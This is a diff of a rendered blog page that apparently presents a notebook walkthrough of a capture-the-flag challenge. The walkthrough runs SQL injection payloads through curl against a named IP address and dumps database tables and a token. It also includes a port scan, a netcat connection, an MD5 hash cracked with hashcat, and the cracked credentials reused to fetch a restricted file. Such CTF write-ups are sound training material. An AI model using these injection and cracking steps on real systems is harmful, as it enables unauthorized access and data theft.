-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'+'b','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [93]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'+'b','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
 </pre>
 </div>
@@ -892,18 +890,18 @@ In [93]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [94]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'||'b','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [94]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'||'b','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=ab"&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
 </pre>
 </div>
@@ -922,18 +920,18 @@ In [94]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [99]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',name%20FROM%20sqlite_master;--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [99]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',name%20FROM%20sqlite_master;--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;token&lt;/a&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;public&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
 </pre>
 </div>
@@ -957,18 +955,18 @@ In [99]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [101]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',sql%20FROM%20sqlite_master%20WHERE%20name='token';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [101]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',sql%20FROM%20sqlite_master%20WHERE%20name='token';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;CREATE TABLE token (token_val NUMERIC)&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
 </pre>
 </div>
@@ -987,18 +985,18 @@ In [101]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [102]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',token_val%20FROM%20token;--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [102]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',token_val%20FROM%20token;--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;336809&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
 </pre>
 </div>
@@ -1011,7 +1009,7 @@ In [102]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>Token <strong>336809</strong> is the next one. </p>
+<p>Token <strong>336809</strong> is the next one.</p>
 </div>
 </div>
 </div>
@@ -1050,35 +1048,35 @@ PORT     STATE SERVICE
 4141/tcp open  oirtgsvc
 7777/tcp open  cbt
 
-Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds
-</code></pre><p>OH! What's behind port <strong>4141</strong>?</p>
+Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds</code></pre>
+<p>OH! What's behind port <strong>4141</strong>?</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [105]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>nc 82.195.79.41 <span class="m">4141</span>
+<div class="prompt input_prompt">In [105]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>nc 82.195.79.41 <span class="m">4141</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">
 dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc:l0WMMMMMMMMMMMMMM
 dddddddddddddddddddddddxdddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNWMMMMM0:......o0NMMMMMMMMMMMM
-dddddddddddddddxxxxdddddddxxxxxddddddddddddddddddddddddddddddxO00kdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,&amp;apos;,;cdOl..........&amp;apos;;cdNMMMMMMMM
-ddddddddddddddxKNNOdddddddOXNXkdddddddddddddddddddddddddddddxxXMMKxddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc....:Kk;............&amp;apos;KMMMMMMMM
+dddddddddddddddxxxxdddddddxxxxxddddddddddddddddddddddddddddddxO00kdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,',;cdOl..........';cdNMMMMMMMM
+ddddddddddddddxKNNOdddddddOXNXkdddddddddddddddddddddddddddddxxXMMKxddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc....:Kk;............'KMMMMMMMM
 ddddddddddddddxNMW0dddddddOWMNkddddddddddddddddddddddddddddddxXMMKdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx;...lO0xc,.........cWMMMMMMMM
 ddddddddddddddxNMW0dddddddOWMNkdddxxkO000OkxddddddxkO000kxxdxxXMMKdddxO00OxddxKMMN00XWNKKKXNWWWXKKKNWMMMMMMWXKKKXNWMMMMMMMMMMMMMMMMMX:....:xKKxl,......kMMMMMMMMM
 ddddddddddddddxNMW0dddddddOWMNkddxOXWWWNWWWXkxddx0NWWWWWWN0xxxXMMKxdkKWWXOxddxKMMKddxkxxxxxx00kxxxdxONMMMWKkxxxxxxONMMMMMMMMMMMMMMMN0::;....,ckKKkoc:;dNMMMMMMMMM
-ddddddddddddddxNMMNKKKKKKKXWMNkddxKXXOxxkKWMNkdx0WWKOxxkXWW0dxXMMKxkNMW0xddxdxKMMKddkKNWNKxdxOXNNNOdd0WMWOxx0NWNKkdkNMMMMMMMMMMMMWK00OOkoo:&amp;apos;...&amp;apos;;ldxxl;dXMMMMMMMM
+ddddddddddddddxNMMNKKKKKKKXWMNkddxKXXOxxkKWMNkdx0WWKOxxkXWW0dxXMMKxkNMW0xddxdxKMMKddkKNWNKxdxOXNNNOdd0WMWOxx0NWNKkdkNMMMMMMMMMMMMWK00OOkoo:'...';ldxxl;dXMMMMMMMM
 ddddddddddddddxNMMNXXXXXXXNWMNkddddxkkOOO0NMWOdkNMXxddddxkOkdxXMMWXWMNOxdddxdxKMMKddONMMMWOxxKMMMMKxdkWMXxdx00000kxx0WMMMMMMMMMWNK00000000Okdc,.........;OWMMMMMM
 ddddddddddddddxNMW0ddddxddOWMNkddkKNWNXXXXWMWOdONMKxdddddxxxdxXMMNKXMWKxdddxdxKMMKddONMMMWOddKMMMMKxdkWMKddxO0000000XWMMMMMMMMMWNK00000000000Okxdxdlc:;;;cXMMMMMM
 ddddddddddddddxNMW0dddddddOWMNkxxKMMKxddxONMWOdxXMNkddxxk00OdxXMMKdxXWMXkxdxdxKMMKddONMMMWOddKMMMMKxdkWMXxdxXMMMMMMMMMMMMMMMMMMMMMWN00000000O00O0WMMMMMWWMMMMMMMM
@@ -1087,13 +1085,13 @@ ddddddddddddddx0KKkdddddddkKK0kdxxOKXNXXOx0KKOdddx0KXNNXK0kddxOKKOdxddkKKKkxdxKM
 ddddddddddddddddddddddddddddddddxddxxxxxddddddddddddxxxxddddddddxddddddddddddxKMMMMMMMMMMMMMMMWXXNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK000000000WMMMMMMMMMMMMMMMMMM
 ddddddddddddddx0kxdkOOxddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMWK0000KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX00000000KWMMMMMMMMMMMMMMMMMM
 ddddddddddddddxOkxkNX0xddxxxddxxxddxxxxddxxxdxxxxdddddxxxxdxdxxxxddxxxxxxddddxKMMMMMMMMMMMMMMN000000KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW00000KK0d:cdKWMMMMMMMMMMMMMM
-ddddddddddddddkXOkKWX0xxdkKKxd0Kkx0XKKKOxOXkdkXKxdddx0KKKKOxOKKKKOxOXKKXXkdddxKMMMMMMMMMMMMMMMWNNXK00c&amp;apos;ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMNKKXXXx,.....:kNMMMMMMMMMMMM
+ddddddddddddddkXOkKWX0xxdkKKxd0Kkx0XKKKOxOXkdkXKxdddx0KKKKOxOKKKKOxOXKKXXkdddxKMMMMMMMMMMMMMMMWNNXK00c'ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMNKKXXXx,.....:kNMMMMMMMMMMMM
 ddddddddddddddkN0dON0xdddxONOkX0xON0xxKNk0NOdkNXxdddON0xk0Oxk0OOXXx0NOx0WKxddxKMMMMMMMMMMMMMMMMMMMMNk,...;dKWMMMMMMMMMMMMMMMMMMMMMMMMNKO0Kd.........;0WMMMMMMMMMM
-ddddddddddddddkN0dON0xddddx0XKXkxONOxxKNk0NOdkNXxdddONOxxOkkXXO0NXx0NkdOWKxddxKMMMMMMMMMMMMMMMMMMMMMMNOo:...cxKWMMMMMMMMMMMMMMMWNKkoc;ckol:&amp;apos;..........ckKNWMMMMMM
-ddddddddddddddkXOdkX0xdddddkNWOddx0XKXXOxxKXKKNKxddxx0XKXXOkKXKKXKx0XkdONKxddxKMMMMMMMMMMMMMMMMMMMMMMMMMWKxc...:ONMMMMMMMMWXOdl;.......&amp;apos;..,clc,..........&amp;apos;:dOKWMM
-ddddddddddddddxxxxxxxddddxk0X0xddddxxxxdddxxxxxxxddddxxxxxdxxxxxxxxxxxdxxxdddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOd;.&amp;apos;:dkkxoc;,......&amp;apos;;:ldkOOo,.&amp;apos;;lol:,&amp;apos;..........,co
-dddddddddddddddddddddddddxkkxddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc&amp;apos;.....&amp;apos;,:lox0XNWMMMMMMMNo,..&amp;apos;;odddol:;,,,,&amp;apos;...
-dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNKOO0KNWWMMMMMMMMMMMMMMMMNOc&amp;apos;..,:ldxdddddddooo
+ddddddddddddddkN0dON0xddddx0XKXkxONOxxKNk0NOdkNXxdddONOxxOkkXXO0NXx0NkdOWKxddxKMMMMMMMMMMMMMMMMMMMMMMNOo:...cxKWMMMMMMMMMMMMMMMWNKkoc;ckol:'..........ckKNWMMMMMM
+ddddddddddddddkXOdkX0xdddddkNWOddx0XKXXOxxKXKKNKxddxx0XKXXOkKXKKXKx0XkdONKxddxKMMMMMMMMMMMMMMMMMMMMMMMMMWKxc...:ONMMMMMMMMWXOdl;.......'..,clc,..........':dOKWMM
+ddddddddddddddxxxxxxxddddxk0X0xddddxxxxdddxxxxxxxddddxxxxxdxxxxxxxxxxxdxxxdddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOd;.':dkkxoc;,......';:ldkOOo,.';lol:,'..........,co
+dddddddddddddddddddddddddxkkxddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc'.....',:lox0XNWMMMMMMMNo,..';odddol:;,,,,'...
+dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNKOO0KNWWMMMMMMMMMMMMMMMMNOc'..,:ldxdddddddooo
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK:....;oddddxxdxxK
 
 *********************************************************
@@ -1121,20 +1119,20 @@ d79a2543ddbb8042a6d14851fb098e0d
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [107]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">echo</span> <span class="s">"d79a2543ddbb8042a6d14851fb098e0d"</span> <span class="o">&gt;</span> <span class="nb">hash</span>
-<span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">0</span> <span class="o">--</span><span class="n">attack</span><span class="o">-</span><span class="n">mode</span> <span class="mi">3</span> <span class="nb">hash</span> <span class="s">'Hackertag?l?l?l?l?l?l'</span>
+<div class="prompt input_prompt">In [107]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+<span class="nb">echo</span> <span class="s2">"d79a2543ddbb8042a6d14851fb098e0d"</span> &gt; <span class="nb">hash</span>
+hashcat -m <span class="m">0</span> --attack-mode <span class="m">3</span> <span class="nb">hash</span> <span class="s1">'Hackertag?l?l?l?l?l?l'</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Initializing hashcat v0.49 with 2 threads and 32mb segment-size...
 
 Added hashes from file hash: 1 (1 salts)
@@ -1281,18 +1279,18 @@ Stopped: Wed Mar 18 21:45:47 2015
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [108]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> -n <span class="s2">"Hackertagblue"</span> <span class="p">|</span> md5sum
+<div class="prompt input_prompt">In [108]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span><span class="nb">echo</span> -n <span class="s2">"Hackertagblue"</span> <span class="p">|</span> md5sum
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">d79a2543ddbb8042a6d14851fb098e0d  -
 </pre>
 </div>
@@ -1321,20 +1319,20 @@ In [108]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [117]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">curl</span> <span class="o">--</span><span class="n">user</span> <span class="n">freddy</span><span class="p">:</span><span class="n">blue</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">82.195</span><span class="o">.</span><span class="mf">79.41</span><span class="o">/</span><span class="n">restricted</span><span class="o">/</span><span class="n">tour</span><span class="o">.</span><span class="n">jpg</span> <span class="o">-</span><span class="n">o</span> <span class="n">tour</span><span class="o">.</span><span class="n">jpg</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
-<span class="n">strings</span> <span class="n">tour</span><span class="o">.</span><span class="n">jpg</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">"=="</span>
+<div class="prompt input_prompt">In [117]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+curl --user freddy:blue http://82.195.79.41/restricted/tour.jpg -o tour.jpg 2&gt; /dev/null
+strings tour.jpg <span class="p">|</span> grep <span class="s2">"=="</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">VG9rZW46IDU1MTI0Mw==
 </pre>
 </div>
@@ -1353,18 +1351,18 @@ In [117]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [119]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span><span class="nb">echo</span> <span class="s2">"VG9rZW46IDU1MTI0Mw=="</span> <span class="p">|</span> base64 -d
+<div class="prompt input_prompt">In [119]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span><span class="nb">echo</span> <span class="s2">"VG9rZW46IDU1MTI0Mw=="</span> <span class="p">|</span> base64 -d
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Token: 551243</pre>
 </div>
 </div>
@@ -1424,9 +1422,9 @@ In [119]:
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/networking/">networking</a><sup>39</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ipython/">ipython</a><sup>16</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/usd/">usd</a><sup>2</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                 </div>
 
                 <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
